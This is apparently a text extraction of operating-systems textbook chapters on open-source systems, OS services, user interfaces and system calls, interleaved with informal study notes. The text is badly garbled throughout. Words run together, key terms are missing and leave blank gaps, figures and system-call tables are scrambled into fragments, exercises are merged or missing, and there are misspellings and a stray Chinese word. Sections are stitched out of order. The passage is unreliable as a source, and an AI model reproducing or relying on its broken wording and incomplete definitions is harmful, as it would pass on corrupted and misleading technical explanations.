3. Boot the virtual machine within Virtualbox.
An alternative to using Virtualbox is to use the free program Qemu (http://wiki.qemu.org/ Download/), which includes the qemu-img command for converting Virtualbox images to Qemu images to easily import them.
With this text, we provide a virtual machine image of GNU/Linux running the Ubuntu release. This image contains the GNU/Linux source code as well as tools for software development. We cover examples involving the GNU/Linux image throughout this text, as well as in a detailed case study in Chapter 20.
1.11.4 BSD UNIX
BSD UNIX has a longer and more complicated history than Linux. It started in 1978 as a derivative of AT&T’s UNIX. Releases from the University of California at Berkeley (UCB) came in source and binary form, but they were not open source because a license from AT&T was required. BSD UNIX’s development was slowed by a lawsuit by AT&T, but eventually a fully functional, open-source version, 4.4BSD-lite, was released in 1994.
Just as with Linux, there are many distributions of BSD UNIX, including FreeBSD, NetBSD, OpenBSD, and DragonflyBSD. To explore the source code of FreeBSD, simply download the virtual machine image of the version of interest and boot it within Virtualbox, as described above for Linux. The source code comes with the distribution and is stored in /usr/src/. The kernel source code is in /usr/src/sys. example, to examine the vir- tual memory implementation code in the FreeBSD kernel, see the files in /usr/src/sys/vm. Alternatively, you can simply view the source code online at https://svnweb.freebsd.org.
As with many open-source projects, this source code is contained in and controlled by a version control system—in this case, “subversion” (https://subversion.apache.org/ source-code). Version control systems allow a user to “pull” an entire source code tree to his computer and “push” any changes back into the repository for others to then pull. These systems also provide other features, including an entire history of each file and a conflict resolution feature in case the same file is changed concurrently. Another
50 Chapter 1 Introduction
version control system is git, which is used for GNU/Linux, as well as other programs
(http://www.git-scm.com).
Darwin, the core kernel component of macOS, is based on BSD UNIX and is open- sourced as well. That source code is available from http://www.opensource.apple.com/. Every macOS release has its open-source components posted at that site. The name of the package that contains the kernel begins with “xnu.” Apple also provides extensive developer tools, documentation, and support at http://developer.apple.com.
THE STUDY OF OPERATING SYSTEMS
There has never been a more interesting time to study operating systems, and it has never been easier. The open-source movement has overtaken oper- ating systems, causing many of them to be made available in both source and binary (executable) format. The list of operating systems available in both formats includes Linux, BSD UNIX, Solaris, and part of macOS. The availabil- ity of source code allows us to study operating systems from the inside out. Questions that we could once answer only by looking at documentation or the behavior of an operating system we can now answer by examining the code itself.
Operating systems that are no longer commercially viable have been open-sourced as well, enabling us to study how systems operated in a time of fewer CPU, memory, and storage resources. An extensive but incomplete list of open-source operating-system projects is available from http://dmoz.org/Computers/Software/Operating Systems/Open Source/.
In addition, the rise of virtualization as a mainstream (and frequently free) computer function makes it possible to run many operating systems on top of one core system. example, VMware (http://www.vmware.com) pro- vides a free “player” for Windows on which hundreds of free “virtual appli- ances” can run. Virtualbox (http:// www.virtualbox.com) provides a free, open-source virtual machine manager on many operating systems. Using such tools, students can try out hundreds of operating systems without ded- icated hardware.
In some cases, simulators of specific hardware are also available, allow- ing the operating system to run on “native” hardware, all within the con- fines of a modern computer and modern operating system. example, a DECSYSTEM-20 simulator running on macOS can boot TOPS-20, load the source tapes, and modify and compile a new TOPS-20 kernel. An interested student can search the Internet to find the original papers that describe the operating system, as well as the original manuals.
The advent of open-source operating systems has also made it easier to make the move from student to operating-system developer. With some knowledge, some effort, and an Internet connection, a student can even create a new operating-system distribution. Not so many years ago, it was difficult or impossible to get access to source code. Now, such access is limited only by how much interest, time, and disk space a student has.
1.11.5 Solaris
Solaris is the commercial UNIX-based operating system of Sun Microsystems. Originally, Sun’s SunOS operating system was based on BSD UNIX. Sun moved to AT&T’s System V UNIX as its base in 1991. In 2005, Sun open-sourced most of the Solaris code as the OpenSolaris project. The purchase of Sun by Oracle in 2009, however, left the state of this project unclear.
Several groups interested in using OpenSolaris have expanded its features, and their working set is Project Illumos, which has expanded from the Open- Solaris base to include more features and to be the basis for several products. Illumos is available at http://wiki.illumos.org.
1.11.6 Open-Source Systems as Learning Tools
The free-software movement is driving legions of programmers to create thousands of open-source projects, including operating systems. Sites like http://freshmeat.net/ and http://distrowatch.com/ provide portals to many of these projects. As we stated earlier, open-source projects enable students to use source code as a learning tool. They can modify programs and test them, help find and fix bugs, and otherwise explore mature, full-featured operating systems, compilers, tools, user interfaces, and other types of programs. The availability of source code for historic projects, such as Multics, can help stu- dents to understand those projects and to build knowledge that will help in the
 implementation of new projects.
Another advantage of working with open-source operating systems is their diversity. GNU/Linux and BSD UNIX are both open-source operating systems, for instance, but each has its own goals, utility, licensing, and purpose. Some- times, licenses are not mutually exclusive and cross-pollination occurs, allow- ing rapid improvements in operating-system projects. example, several major components of OpenSolaris have been ported to BSD UNIX. The advan- tages of free software and open sourcing are likely to increase the number and quality of open-source projects, leading to an increase in the number of individuals and companies that use these projects.
1.12 Summary Anoperatingsystemissoftwarethatmanagesthecomputerhardware,as
well as providing an environment for application programs to run.
Interrupts are a key way in which hardware interacts with the operating system. A hardware device triggers an interrupt by sending a signal to the CPU to alert the CPU that some event requires attention. The interrupt is managed by the interrupt handler.
Foracomputertodoitsjobofexecutingprograms,theprogramsmustbe in main memory, which is the only large storage area that the processor can access directly.
Themainmemoryisusuallyavolatilestoragedevicethatlosesitscontents when power is turned off or lost.
1.12 Summary 51
52 Chapter 1 Introduction
Nonvolatile storage is an extension of main memory and is capable of holding large quantities of data permanently.
The most common nonvolatile storage device is a hard disk, which can provide storage of both programs and data.
Thewidevarietyofstoragesystemsinacomputersystemcanbeorganized in a hierarchy according to speed and cost. The higher levels are expensive, but they are fast. As we move down the hierarchy, the cost per bit generally decreases, whereas the access time generally increases.
Moderncomputerarchitecturesaremultiprocessorsystemsinwhicheach CPU contains several computing cores.
TobestutilizetheCPU,modernoperatingsystemsemploymultiprogram- ming, which allows several jobs to be in memory at the same time, thus ensuring that the CPU always has a job to execute.
Multitasking is an extension of multiprogramming wherein CPU schedul- ing algorithms rapidly switch between processes, providing users with a fast response time.
To prevent user programs from interfering with the proper operation of the system, the system hardware has two modes: user mode and kernel mode.
Various instructions are privileged and can be executed only in kernel mode. Examples include the instruction to switch to kernel mode, I/O control, timer management, and interrupt management.
A process is the fundamental unit of work in an operating system. Pro- cess management includes creating and deleting processes and providing mechanisms for processes to communicate and synchronize with each other.
An operating system manages memory by keeping track of what parts of memory are being used and by whom. It is also responsible for dynami- cally allocating and freeing memory space.
Storagespaceismanagedbytheoperatingsystem;thisincludesproviding file systems for representing files and directories and managing space on mass-storage devices.
Operating systems provide mechanisms for protecting and securing the operating system and users. Protection measures control the access of processes or users to the resources made available by the computer system.
Virtualization involves abstracting a computer’s hardware into several different execution environments.
Data structures that are used in an operating system include lists, stacks, queues, trees, and maps.
Computingtakesplaceinavarietyofenvironments,includingtraditional computing, mobile computing, client–server systems, peer-to-peer sys- tems, cloud computing, and real-time embedded systems.
Practice Exercises 53
- Free and open-source operating systems are available in source-code for- mat. Free
software is licensed to allow no-cost use, redistribution, and modification. GNU/Linux, FreeBSD, and Solaris are examples of popular open-source systems.
Practice Exercises
. 1.1 What are the three main purposes of an operating system?
. 1.2 We have stressed the need for an operating system to make efficient use of
the computing hardware. When is it appropriate for the operating system to forsake this principle and to “waste” resources? Why is such a system not really wasteful?
. 1.3 What is the main difficulty that a programmer must overcome in writing an operating system for a real-time environment?
. 1.4 Keeping in mind the various definitions of operating system, consider whether the operating system should include applications such as web browsers and mail programs. Argue both that it should and that it should not, and support your answers.
. 1.5 How does the distinction between kernel mode and user mode function as a rudimentary form of protection (security)?
. 1.6 Which of the following instructions should be privileged?
a. Set value of timer.
b. Read the clock.
c. Clear memory.
d. Issue a trap instruction.
e. Turn off interrupts.
f. Modify entries in device-status table.
g. Switch from user to kernel mode.
h. Access I/O device. . 1.7 Some early computers protected the operating system by placing it in a memory partition that could not be modified by either the user job or the operating system itself. Describe two difficulties that you think could arise with such a scheme.
. 1.8 Some CPUs provide for more than two modes of operation. What are two possible uses of these multiple modes?
. 1.9 Timers could be used to compute the current time. Provide a short description of how this could be accomplished.
. 1.10 Give two reasons why caches are useful. What problems do they solve? What problems do they cause? If a cache can be made as large as the
54 Chapter 1 Introduction
device for which it is caching (for instance, a cache as large as a disk),
why not make it that large and eliminate the device?
1.11 Distinguish between the client–server and peer-to-peer models of dis- tributed systems.
Further Reading
Many general textbooks cover operating systems, including [Stallings (2017)] and [Tanenbaum (2014)]. [Hennessy and patternson (2012)] provide coverage of I/O systems and buses and of system architecture in general. [Kurose and Ross (2017)] provides a general overview of computer networks.
[Russinovich et al. (2017)] give an overview of Microsoft Windows and cov- ers considerable technical detail about the system internals and components. [McDougall and Mauro (2007)] cover the internals of the Solaris operating system. The macOS and iOS internals are discussed in [Levin (2013)]. [Levin (2015)] covers the internals of Android. [Love (2010)] provides an overview of the Linux operating system and great detail about data structures used in the Linux kernel. The Free Software Foundation has published its philosophy at http://www.gnu.org/philosophy/free-software-for-freedom.html. Bibliography
[Hennessy and patternson (2012)] J. Hennessy and D. patternson, Computer Archi- tecture: A Quantitative Approach, Fifth Edition, Morgan Kaufmann (2012).
[Kurose and Ross (2017)] J. Kurose and K. Ross, Computer Networking—A Top– Down Approach, Seventh Edition, Addison-Wesley (2017).
[Levin (2013)]
(2013).
[Levin (2015)]
(2015).
[Love (2010)]
J. Levin, Mac OS X and iOS Internals to the Apple’s Core, Wiley
J. Levin, Android Internals–A Confectioner’s Cookbook. Volume I R. Love, Linux
Kernel Development, Third Edition, Developer’s Library (2010).
[McDougall and Mauro (2007)] R. McDougall and J. Mauro, Solaris Internals, Second Edition, Prentice Hall (2007).
[Russinovich et al. (2017)] M. Russinovich, D. A. Solomon, and A. Ionescu, Win- dows Internals–Part 1, Seventh Edition, Microsoft Press (2017).
[Stallings (2017)] W. Stallings, Operating Systems, Internals and Design Principles (9th Edition) Ninth Edition, Prentice Hall (2017).
[Tanenbaum (2014)] A. S. Tanenbaum, Modern Operating Systems, Prentice Hall (2014).
Chapter 1 Exercises
. 1.12 How do clustered systems differ from multiprocessor systems? What is required for two machines belonging to a cluster to cooperate to provide a highly available service? Describe two ways in which the cluster software can manage access to the data on the disk. Discuss the benefits and disadvantages of each.
. 1.14 What is the purpose of interrupts? How does an interrupt differ from a trap? Can traps be generated intentionally by a user program? If so, for what purpose?
. 1.15 Explain how the Linux kernel variables HZ and jiffies can be used to determine the number of seconds the system has been running since it was booted.
. 1.16 Direct memory access is used for high-speed I/O devices in order to avoid increasing the CPU’s execution load.
a. How does the CPU interface with the device to coordinate the transfer?
b. How does the CPU know when the memory operations are com- plete?
c. The CPU is allowed to execute other programs while the DMA controller is transferring data. Does this process interfere with the execution of the user programs? If so, describe what forms of interference are caused.
. 1.17 Some computer systems do not provide a privileged mode of operation in hardware. Is it possible to construct a secure operating system for these computer systems? Give arguments both that it is and that it is not possible.
. 1.18 Many SMP systems have different levels of caches; one level is local to each processing core, and another level is shared among all processing cores. Why are caching systems designed this way?
1.19 Rank the following storage systems from slowest to fastest:
a. Hard-disk drives b. Registers
c. Optical disk
d. Main memory
e. Nonvolatile memory
f. Magnetic tapes
g. Cache
EX-1
EX-2 Exercises
. 1.20 Consider an SMP system similar to the one shown in Figure 1.8. Illustrate with an example how data residing in memory could in fact have a different value in each of the local caches.
. 1.21 Discuss, with examples, how the problem of maintaining coherence of cached data manifests itself in the following processing environments:
a. Single-processor systems
b. Multiprocessor systems
c. Distributed systems
. 1.22 Describe a mechanism for enforcing memory protection in order to prevent a program from modifying the memory associated with other programs. lowing environments?
a. A campus student union
b. Several campus locations across a statewide university system
c. A neighborhood
. 1.24 Describe some of the challenges of designing operating systems for mobile devices compared with designing operating systems for tradi- tional PCs.
. 1.25 What are some advantages of peer-to-peer systems over client – server systems?
. 1.26 Describe some distributed applications that would be appropriate for a peer-to-peer system.
. 1.27 Identify several advantages and several disadvantages of open-source operating systems. Identify the types of people who would find each aspect to be an advantage or a disadvantage.
2.11 Summary
- An operating system provides an environment for the execution of pro-
grams by providing services to users and programs.
- The three primary approaches for interacting with an operating system are (1) command interpreters, (2) graphical user interfaces, and (3) touch- screen interfaces.
- Systemcallsprovideaninterfacetotheservicesmadeavailablebyanoper- ating system. Programmers use a system call’s application programming interface (API) for accessing system-call services.
- System calls can be divided into six major categories: (1) process control, (2) file management, (3) device management, (4) information maintenance, (5) communications, and (6) protection.
- The standard C library provides the system-call interface for UNIX and Linux systems.
- Operating systems also include a collection of system programs that pro- vide utilities to users.
- A linker combines several relocatable object modules into a single binary executable file. A loader loads the executable file into memory, where it becomes eligible to run on an available CPU.
- There are several reasons why applications are operating-system specific. These include different binary formats for program executables, different instruction sets for different CPUs, and system calls that vary from one operating system to another.
- An operating system is designed with specific goals in mind. These goals ultimately determine the operating system’s policies. An operating system implements these policies through specific mechanisms. - A monolithic operating system has no structure; all functionality is pro- vided in a single, static binary file
that runs in a single address space. Although such systems are difficult to modify, their primary benefit is efficiency.
- A layered operating system is divided into a number of discrete layers, where the bottom layer is the hardware interface and the highest layer is the user interface. Although layered software systems have had some suc-
                    cess, this approach is generally not ideal for designing operating systems
due to performance problems.
- Themicrokernelapproachfordesigningoperatingsystemsusesaminimal kernel; most services run as user- level applications. Communication takes place via message passing.
- Amodularapproachfordesigningoperatingsystemsprovidesoperating- system services through modules that can be loaded and removed during run time. Many contemporary operating systems are constructed as hybrid systems using a combination of a monolithic kernel and modules.
- Abootloaderloadsanoperatingsystemintomemory,performsinitializa- tion, and begins system execution.
- The performance of an operating system can be monitored using either counters or tracing. Counters are a collection of system-wide or per- process statistics, while tracing follows the execution of a program through the operating system.
Practice Exercises
    What is the purpose of system calls?
    What is the purpose of the command interpreter? Why is it usually
separate from the kernel?
    What system calls have to be executed by a command interpreter or shell in order to start a new process on a UNIX system?
    What is the purpose of system programs?
    What is the main advantage of the layered approach to system design?
What are the disadvantages of the layered approach?
    List five services provided by an operating system, and explain how each creates convenience for
^ chapter 2.1 Operating-System Services
An operating system provides an environment for the execution of programs. It makes certain services available to programs and to the users of those pro- grams. The specific services provided, of course, differ from one operating system to another, but we can identify common classes. Figure 2.1 shows one view of the various operating-system services and how they interrelate. Note that these services also make the programming task easier for the programmer.  One set of operating system services provides functions that are helpful to the user.
user interface. Almost all operating systems have a user interface(UI). interface can take several forms. Most commonly:
  - graphical user interfaxe (GUI): the interface is a window system with a mouse that serves as a pointing device to direct I/O, choose from menus, and make selections and a keyboard to enter text.
  - touch-screen interface, Mobile systems such as phones and tablets, enabling users to slide their fingers across the screen or press buttons on the screen to select choices.
  - Command-line interface (CLI): uses text commands
Program exencution: The system must be able to load a program into memory and to run the program. The program must be able to end its execution, either normally or abnormally (indicating error).
I.O operations: ArunningprogrammayrequireI/O,whichmayinvolvea file or an I/O device. For specific devices, special functions may be desired (such as reading from a network interface or writing to a file system). For efficiency and protection, users usually cannot control I/O devices directly. Therefore, the operating system must provide a means to do I/O.
File-system manipulation 操作: programs need to read, write,create, delete, search and list files and directories. Finally, some operating systems include permissions management to allow or deny access to files/ directories based on file ownership. Many operating systems provide a variety of file systems, sometimes to allow personal choice and sometimes to provide specific features or performance characteristics.
Communictaion:There are many circumstances in which one process needs to exchange information with another process.
  - Such communication may occur:
  - between processes executing on the same computer
  - between processes executing on different computer systems tied by
network.
  - Communications may be implemented via:
  - shared memory, two/more processes read and write to a shared
section of memory,
  - message passing, packets of information in predefined formats are
moved between processes by the operating system.
Error detection: The operating system needs to be detecting and correcting errors constantly. Errors may occur in the CPU and memory hardware (such as a memory error or a power failure), in I/O devices (such as a parity error on disk, a connection failure on a network, or lack of paper in the printer), and in the user program (such as an arithmetic overflow or an attempt to access an illegal memory location). For each type of error, the operating system should take the appropriate action to ensure correct and consistent computing. Sometimes, it has no choice but to halt the system. At other times, it might terminate an error- causing process or return an error code to a process for the process to detect and possibly correct.
Another set of operating-system functions exists not for helping the user but rather for ensuring the efficient operation of the system itself. Systems with multiple processes can gain efficiency by sharing the computer resources among the different processes.
Resource allocation: When there are multiple processes running at the same time, resources must be allocated to each of them. The operating system manages many different types of resources. Some (such as CPU cycles, main memory, and file storage) may have special allocation code, whereas others (such as I/O devices) may have much more general request and release code. For instance, in determining how best to use the CPU, operating systems have CPU-scheduling routines that take into account the speed of the CPU, the process that must be executed, the number of processing cores on the CPU, and other factors. There may also be routines to allocate printers, USB storage drives, and other peripheral devices.
Accounting: Logging: We want to keep track of which programs use how much and what kinds of computer resources. This record keeping may be used for accounting (so that users can be billed) or simply for accumulating usage statistics. Usage statistics may be a valuable tool for system administrators who wish to reconfigure the system to improve computing services.
Protection and security: control use of the information. When several separate processes execute concurrently, it should not be possible for one process to interfere with the others or with the operating system itself.
Protection involves ensuring that all access to system resources is controlled. Security of the system from outsiders is also important
  - requiring each user to authenticate itself to the system (like by password).
  - extends to defending external I/O devices from invalid access attempts, recording all such connections for detection of break-ins. (like network adapters)
If a system is to be protected and secure, precautions must be instituted throughout it. A chain is only as strong as its weakest link.
^ chapter 2.2 User and Operating-System Interface
3 fundamental interface:
command-line interface / command interoreter: allows users enter commands
to be performed by the operating system.
graphical user interface, GUI. touch-screen interface
^ chapter 2.2.1 Command Interpreters
Most operating systems, including Linux, UNIX, and Windows, treat the command interpreter as a special program that is running when a process is initiated or when a user first logs on (on interactive systems).
On systems with multiple command interpreters to choose from, the interpreters are known as shells.
Example, on UNIX and Linux systems, a user may choose several different shells: C shell, Bourne-Again shell, Korn shell, and others.
Third-party shells and free user-written shells are also available. Most shells provide similar functionality
choice of shell based on personal preference.
The main function of the command interpreter is to get and execute the next user-specified command. Many of the commands given at this level manipulate files: create, delete, list, print, copy, execute, and so on.
The various shells available on UNIX systems operate in this way. These commands can be imple- mented in two general ways.
In one approach, the command interpreter itself contains the code to exe- cute the command. example, a command to delete a file may cause the command interpreter to jump to a section of its code that sets up the parameters and makes the appropriate system call. In this case, the number of commands that can be given determines the size of the command interpreter, since each command requires its own implementing code.
An alternative approach—used by UNIX, among other operating systems — implements most commands through system programs. In this case, the command interpreter does not understand the command in any way; it merely uses the command to identify a file to be loaded into memory and executed. Thus, the UNIX command to delete a file
rm file.txt
would search for a file called rm, load the file into memory, and execute it with the parameter file.txt. The logic associated with the rm command would be
                                          
Figure 2.2 The bash shell command interpreter in macOS.
defined completely by the code in the file rm. In this way, programmers can add new commands to the system easily by creating new files with the proper program logic. The command-interpreter program, which can be small, does not have to be changed for new commands to be added.
^ chapter 2.2.2 Graphical User Interface
A second strategy for interfacing with the operating system is through a user- friendly graphical user interface, or GUI. Here, rather than entering commands directly via a command-line interface, users employ a mouse-based window- and-menu system characterized by a         metaphor. The user moves the mouse to position its pointer on images, or      , on the screen (the desktop) that represent programs, files, directories, and system functions. Depending on the mouse pointer’s location, clicking a button on the mouse can invoke a program, select a file or directory—known as a       —or pull down a menu that contains commands.
Graphical user interfaces first appeared due in part to research taking place in the early 1970s at Xerox PARC research facility. The first GUI appeared on the Xerox Alto computer in 1973. However, graphical interfaces became more widespread with the advent of Apple Macintosh computers in the 1980s. The user interface for the Macintosh operating system has undergone various changes over the years, the most significant being the adoption of the Aqua interface that appeared with macOS. Microsoft’s first version of Windows— Version 1.0—was based on the addition of a GUI interface to the MS-DOS operating system. Later versions of Windows have made significant changes in the appearance of the GUI along with several enhancements in its functionality.
                                         Traditionally, UNIX systems have been dominated by command-line inter- faces. Various GUI interfaces are available, however, with significant develop- ment in GUI designs from various open-source projects, such as K Desktop Environment (or KDE) and the GNOME desktop by the GNU project. Both the KDE and GNOME desktops run on Linux and various UNIX systems and are available under open-source licenses, which means their source code is readily available for reading and for modification under specific license terms.
^ chapter 2.2.3 Touch-Screen Interface
smartphones and handheld tablet computers use touch-screen interface. users interact by making gestures on the touch screen
Example, pressing and swiping fingers across the screen.
physical keyboard or simulate a keyboard on the touch screen.
Both the iPad iPhone use the Springboard touch-screen interface.
^ chapter 2.2.4 Choice of Interface
command-line interface: System administrators who manage computers and power users with deep knowledge of a system
more efficient, faster access to the activities need to perform.
make repetitive tasks easier, they have their own programm ability.
example, if a frequent task requires a set of command-line steps, those steps can be recorded into a file, and that file can be run just like a program. The program is not compiled into executable code but rather is interpreted by the command- line interface. These shell scripts are very common on systems that are command-line oriented, such as UNIX and Linux.
GUI
Recent versions of the Windows operating system provide both a standard GUI for desktop/laptops and touch screen for tablets.
The various changes undergone by the Macintosh operating systems also provide a nice study in contrast.
Historically, Mac OS has not provided a command-line interface, always requiring its users to interface with the operating system using its GUI. However, with the release of macOS, the operating system now provides both an Aqua GUI and a command-line interface.
Although there are apps that provide a command-line interface for iOS and Android mobile systems, they are rarely used. Instead, almost all users of mobile systems interact with their devices using the touch-screen interface.
The user interface can vary from system to system and even from user to user within a system; however, it typically is substantially removed from the actual system structure. The design of a useful and intuitive user interface is therefore not a direct function of the operating system. In this book, we concentrate on the fundamental problems of providing adequate service to user programs. From the point of view of the operating system, we do not
distinguish between user programs and system programs.
2.3 System Calls
             provide an interface to the services made available by an operat- ing system. These calls are generally available as functions written in C and C++, although certain low-level tasks (example, tasks where hardware must be accessed directly) may have to be written using assembly-language instructions.
2.3.1 Example
Before we discuss how an operating system makes system calls available, let’s first use an example to illustrate how system calls are used: writing a simple program to read data from one file and copy them to another file. The first input that the program will need is the names of the two files: the input file and the output file. These names can be specified in many ways, depending on the operating-system design. One approach is to pass the names of the two files as part of the command—example, the UNIX cp command:
cp in.txt out.txt
This command copies the input file in.txt to the output file out.txt. A sec- ond approach is for the program
to ask the user for the names. In an interactive system, this approach will require a sequence of system calls, first to write a prompting message on the screen and then to read from the keyboard the characters that define the two files. On mouse-based and icon-based systems, a menu of file names is usually displayed in a window. The user can then use the mouse to select the source name, and a window can be opened for the destination name to be specified. This sequence requires many I/O system calls.
Once the two file names have been obtained, the program must open the input file and create and open the output file. Each of these operations requires another system call. Possible error conditions for each system call must be handled. example, when the program tries to open the input file, it may find that there is no file of that name or that the file is protected against access. In these cases, the program should output an error message (another sequence of system calls) and then terminate abnormally (another system call). If the input file exists, then we must create a new output file. We may find that there is already an output file with the same name. This situation may cause the program to abort (a system call), or we may delete the existing file (another system call) and create a new one (yet another system call). Another option, in an interactive system, is to ask the user (via a sequence of system calls to output the prompting message and to read the response from the terminal) whether to replace the existing file or to abort the program.
When both files are set up, we enter a loop that reads from the input file (a system call) and writes to the output file (another system call). Each read and write must return status information regarding various possible error conditions. On input, the program may find that the end of the file has been
   
                destination file source file
Example System-Call Sequence Acquire input file name
Write prompt to screen
Accept input
Acquire output file name
Write prompt to screen
Accept input Open the input file
if file doesn't exist, abort Create output file if file exists, abort Loop
Read from input file
Write to output file
Until read fails
Close output file
Write completion message to screen Terminate normally
Figure 2.5 Example of how system calls are used.
reached or that there was a hardware failure in the read (such as a parity error). The write operation may encounter various errors, depending on the output device (example, no more available disk space). Finally, after the entire file is copied, the program may close both files (two system calls), write a message to the console or window (more system calls), and finally terminate normally (the final system call). This system-call sequence is shown in Figure 2.5.
2.3.2 Application Programming Interface
As you can see, even simple programs may make heavy use of the operat- ing system. Frequently, systems execute thousands of system calls per second. Most programmers never see this level of detail, however. Typically, applica- tion developers design programs according to an                                   (   ). The API specifies a set of functions that are available to an appli- cation programmer, including the parameters that are passed to each function and the return values the programmer can expect. Three of the most common APIs available to application programmers are the Windows API for Windows systems, the POSIX API for POSIX-based systems (which include virtually all versions of UNIX, Linux, and macOS), and the Java API for programs that run on the Java virtual machine. A programmer accesses an API via a library of code provided by the operating system. In the case of UNIX and Linux for programs written in the C language, the library is called     . Note that — unless specified —the system-call names used throughout this text are generic examples. Each operating system has its own name for each system call. Behind the scenes, the functions that make up an API typically invoke the actual system calls on behalf of the application programmer. example, the Windows function CreateProcess() (which, unsurprisingly, is used to create
                                         EXAMPLE OF STANDARD API
example of a standard API, consider the read() function that is avail- able in UNIX and Linux systems. The API for this function is obtained from the man page by invoking the command
man read
on the command line. A description of this API appears below:
#include <unistd.h> ssize_t
return value
read(int fd, void *buf, size_t count)
function parameters name
A program that uses the read() function must include the unistd.h header file, as this file defines the ssize t and size t data types (among other things). The parameters passed to read() are as follows:
- int fd—the file descriptor to be read
- void *buf—a buffer into which the data will be read
- size t count—the maximum number of bytes to be read into the buffer
On a successful read, the number of bytes read is returned. A return value of 0 indicates end of file. If an error occurs, read() returns −1.
a new process) actually invokes the NTCreateProcess() system call in the Windows kernel.
Why would an application programmer prefer programming according to an API rather than invoking actual system calls? There are several reasons for doing so. One benefit concerns program portability. An application program- mer designing a program using an API can expect her program to compile and run on any system that supports the same API (although, in reality, architectural differences often make this more difficult than it may appear). Furthermore, actual system calls can often be more detailed and difficult to work with than the API available to an application programmer. Nevertheless, there often exists a strong correlation between a function in the API and its associated system call within the kernel. In fact, many of the POSIX and Windows APIs are similar to the native system calls provided by the UNIX, Linux, and Windows operating systems.
Another important factor in handling system calls is the                        (   ) — the full suite of software needed to execute applications writ- ten in a given programming language, including its compilers or interpreters as well as other software, such as libraries and loaders. The RTE provides a
                    user mode
kernel mode
open( )
i
user application system call interface
open( )
Implementation of open( ) system call return
Figure 2.6
The handling of a user application invoking the open() system call.                       that serves as the link to system calls made available by the operating system. The system-call interface intercepts function calls in the API and invokes the necessary system calls within the operating system. Typically, a number is associated with each system call, and the system-call interface maintains a table indexed according to these numbers. The system- call interface then invokes the intended system call in the operating-system kernel and returns the status of the system call.
The caller need know nothing about how the system call is implemented or what it does during execution. Rather, the caller need only obey the API and understand what the operating system will do as a result of the execution of that system call. Thus, most of the details of the operating-system interface are hidden from the programmer by the API and are managed by the RTE. The relationship among an API, the system-call interface, and the operating system is shown in Figure 2.6, which illustrates how the operating system handles a user application invoking the open() system call.
System calls occur in different ways, depending on the computer in use. Often, more information is required than simply the identity of the desired system call. The exact type and amount of information vary according to the particular operating system and call. example, to get input, we may need to specify the file or device to use as the source, as well as the address and length of the memory buffer into which the input should be read. Of course, the device or file and length may be implicit in the call.
Three general methods are used to pass parameters to the operating sys- tem. The simplest approach is to pass the parameters in registers. In some cases, however, there may be more parameters than registers. In these cases, the parameters are generally stored in a block, or table, in memory, and the address of the block is passed as a parameter in a register (Figure 2.7). Linux uses a combination of these approaches. If there are five or fewer parameters,
                                        
X: parameters for call
load address X system call 13 Figure 2.7
Passing of parameters as a table. register
X
user program
registers are used. If there are more than five parameters, the block method is used. Parameters also can be placed, or       , onto a       by the program and        off the stack by the operating system. Some operating systems prefer the block or stack method because those approaches do not limit the number or length of parameters being passed.
2.3.3 Types of System Calls
System calls can be grouped roughly into six major categories:                ,               ,                ,                       ,                , and           . Below, we briefly discuss the types of system calls that may be provided by an operating system. Most of these system calls support, or are supported by, concepts and functions that are discussed in later chap- ters. Figure 2.8 summarizes the types of system calls normally provided by an operating system. As mentioned, in this text, we normally refer to the system calls by generic names. Throughout the text, however, we provide examples of the actual counterparts to the system calls for UNIX, Linux, and Windows systems.
                       
A running program needs to be able to halt its execution either normally (end()) or abnormally (abort()). If a system call is made to terminate the currently running program abnormally, or if the program runs into a problem and causes an error trap, a dump of memory is sometimes taken and an error message generated. The dump is written to a special log file on disk and may be examined by a         —a system program designed to aid the programmer in finding and correcting errors, or     —to determine the cause of the problem. Under either normal or abnormal circumstances, the operating system must transfer control to the invoking command interpreter. The command interpreter then reads the next command. In an interactive system, the command interpreter simply continues with
the next command; it is assumed that the user will issue an appropriate command to respond to
use parameters from table X operating system
code for system call 13
- Processcontrol
◦ create process, terminate process
◦ load, execute
◦ get process attributes, set process attributes ◦ wait event, signal event
◦ allocate and free memory
- Filemanagement
◦ create file, delete file
◦ open, close
◦ read, write, reposition
◦ get file attributes, set file attributes
- Devicemanagement
◦ request device, release device
◦ read, write, reposition
◦ get device attributes, set device attributes ◦ logically attach or detach devices
- Information maintenance
◦ get time or date, set time or date
◦ get system data, set system data
◦ get process, file, or device attributes ◦ set process, file, or device attributes
- Communications
◦ create, delete communication connection
◦ send, receive messages
◦ transfer status information
◦ attach or detach remote devices
- Protection
◦ get file permissions
◦ set file permissions
Figure 2.8 Types of system calls.
                   
                                        
EXAMPLES OF WINDOWS AND UNIX SYSTEM CALLS
The following illustrates various equivalent system calls for Windows and UNIX operating systems.
               
               
                                                                   
       
CreateProcess() ExitProcess() WaitForSingleObject() CreateFile() ReadFile() WriteFile() CloseHandle() SetConsoleMode() ReadConsole() WriteConsole() GetCurrentProcessID() SetTimer()
Sleep()
CreatePipe() CreateFileMapping() MapViewOfFile() SetFileSecurity() InitlializeSecurityDescriptor() SetSecurityDescriptorGroup()     
fork()
exit()
wait()
open()
read()
write()
close()
ioctl()
read()
write()
getpid()
alarm()
sleep()
pipe()
shm open() mmap()
chmod()
umask()
chown()
any error. In a GUI system, a pop-up window might alert the user to the error and ask for guidance. Some systems may allow for special recovery actions in case an error occurs. If the program discovers an error in its input and wants to terminate abnormally, it may also want to define an error level. More severe errors can be indicated by a higher-level error parameter. It is then possible to combine normal and abnormal termination by defining a normal termination as an error at level 0. The command interpreter or a following program can use this error level to determine the next action automatically.
A process executing one program may want to load() and execute() another program. This feature allows the command interpreter to execute a program as directed by, example, a user command or the click of a mouse. An interesting question is where to return control when the loaded program terminates. This question is related to whether the existing program is lost, saved, or allowed to continue execution concurrently with the new program.
If control returns to the existing program when the new program termi- nates, we must save the memory image of the existing program; thus, we have
                    THE STANDARD C LIBRARY
The standard C library provides a portion of the system-call interface for many versions of UNIX and Linux. example, let’s assume a C pro- gram invokes the printf() statement. The C library intercepts this call and invokes the necessary system call (or calls) in the operating system—in this instance, the write() system call. The C library takes the value returned by write() and passes it back to the user program:
#include <stdio.h> int main( ) - {
printf ("Greetings"); •
return 0; } user mode
kernel mode
effectively created a mechanism for one program to call another program. If both programs continue concurrently, we have created a new process to be multiprogrammed. Often, there is a system call specifically for this purpose (create process()).
If we create a new process, or perhaps even a set of processes, we should be able to control its execution. This control requires the ability to determine and reset the attributes of a process, including the process’s priority, its max- imum allowable execution time, and so on (get process attributes() and set process attributes()). We may also want to terminate a process that we created (terminate process()) if we find that it is incorrect or is no longer needed.
